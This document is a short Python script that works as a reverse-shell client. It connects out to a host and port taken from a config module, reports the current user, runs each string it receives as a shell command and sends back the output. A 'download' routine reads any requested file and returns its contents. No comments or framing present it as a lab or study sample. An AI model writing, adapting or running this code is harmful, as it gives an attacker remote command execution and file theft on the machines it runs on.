import socket
import os
import time
from config import setHosts
global modules

modules = ["download"]

def socketConnect():
    global s
    global host
    s = socket.socket()
    host, port = setHosts()
    print("Connecting to", host, "at port", port)

    s.connect((host, port))
    localuser = str(os.popen("whoami").read())
    s.sendall(localuser.encode('utf-8'))
    recvCommand()
def recvCommand():
    recieved = s.recv(1024).decode('UTF-8')
    while recieved != "exit":
        sendOutput(recieved)
        recieved = s.recv(1024).decode('UTF-8')
    s.close()
def sendOutput(recieved):
    if recieved not in modules:
        commandOutput = os.popen(recieved).read()
    elif recieved in modules:
        command = str(recieved) + "()"
        exec(command)
        commandOutput = ""
    if commandOutput != "":
        s.sendall(commandOutput.encode('utf-8'))
    else:
        s.sendall(" ".encode("utf-8"))
def download():
    path = str(s.recv(1024).decode("utf-8"))
    time.sleep(0.5)
    f = open(path, "rt")
    data = str(f.read())
    s.send(data.encode('utf-8'))
socketConnect()
